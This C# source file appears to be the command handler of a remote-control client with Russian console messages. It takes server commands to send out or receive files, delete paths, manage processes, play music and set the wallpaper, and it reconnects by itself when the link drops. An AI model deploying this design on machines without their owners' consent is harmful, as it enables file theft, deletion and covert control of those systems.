using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace ClientRecive.assets.Commands
{
    public class ServerHandler
    {
        private readonly TcpClient client;

        public ServerHandler(TcpClient client)
        {
            this.client = client;
        }

        public async Task Handle()
        {
            try
            {
                while (true)
                {
                    ICommand commandHandler = await GetCommandHandler(client);

                    if (commandHandler != null)
                    {
                        await commandHandler.ExecuteAsync(client);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при обработке соединения: {ex.Message}");
            }
        }

        private async Task<ICommand> GetCommandHandler(TcpClient client)
        {
            try
            {
                string[] Data = default;
                string LocalCommand;
                string Value = await Client.ReceiveMessageFromServer(client);

                if ((LocalCommand = Value is "$stop" ? "$stop" : Value.Split(' ')[0]) != null)
                {
                    Data = Value.Split(' ');
                }

                switch (LocalCommand)
                {
                    case "$download":

                        string SendPath = Value.Any(c => c == ' ') ? string.Join(" ", Data.Skip(1)) : Data[1];

                        if (File.Exists(SendPath) || Directory.Exists(SendPath))
                        {
                            await Client.SendClientMessage(client, "$success");
                            return new SendCommand(SendPath);
                        }
                        else
                        {
                            await Client.SendClientMessage(client, "$error");
                            Console.WriteLine($"Путь для отправки клиенту некорректен - {SendPath}");
                        }

                        break;

                    case "$upload":

                        string SavePath = Value.Any(c => c == ' ') ? string.Join(" ", Data.Skip(1)) : Data[1];

                        if (Directory.Exists(SavePath))
                        {
                            await Client.SendClientMessage(client, "$success");
                            return new ReciveCommand(SavePath);
                        }
                        else
                        {
                            await Client.SendClientMessage(client, "$error");
                            Console.WriteLine($"Путь для получения файла от клиента некорректен - {SavePath}");
                        }

                        break;

                    case "$delete":

                        string ReciveDeletePath = Value.Any(c => c == ' ') ? string.Join(" ", Data.Skip(1)) : Data[1];

                        if (Directory.Exists(ReciveDeletePath) || File.Exists(ReciveDeletePath))
                        {
                            await Client.SendClientMessage(client, "$success");
                            return new DeleteReciveCommand(ReciveDeletePath);
                        }
                        else
                        {
                            await Client.SendClientMessage(client, "$error");
                            Console.WriteLine($"Путь для удаления файла от клиента некорректен - {ReciveDeletePath}");
                        }

                        break;

                    case "$stop":

                        client.Close();

                        await Console.Out.WriteLineAsync("\nСервер сообщил о прекращении работы, начало переподключения...");
                        Thread.Sleep(5000);
                        await Start.client.Connect();

                        break;


                    case "$exists":

                        return new Exists(Data[1]);

                    case var tempCommand when LocalCommand.Contains("Process"):


                        if (Value.Any(c => c == ' '))
                        {
                            Data[1] = string.Join(" ", Data.Skip(1));
                            return new ProcessCommand(LocalCommand, Data[1]);
                        }
                        else
                        {
                            return new ProcessCommand(LocalCommand);
                        }
                    case "$play":

                        Data[1] = Value.Any(c => c == ' ') ? string.Join(" ", Data.Skip(1)) : Data[1];

                        return new MusicCommand(Data[1]);

                    case "$setwallpaper":

                        Data[1] = Value.Any(c => c == ' ') ? string.Join(" ", Data.Skip(1)) : Data[1];

                        return new WallpaperCommand(Data[1]);

                    default:
                        Console.WriteLine($"Неизвестная команда: {Data[0]}");

                        await Client.SendClientMessage(client, "$error");
                        return null;
                }


                return null;
            }
            catch (SocketException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (IOException)
            {
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nОшибка " + ex.Message);
                await Console.Out.WriteLineAsync("\nСоединение с сервером потеряно, попытка переподключиться");
                await Start.client.Connect();
                Console.ResetColor();
            }

            return null;
        }

    }
}
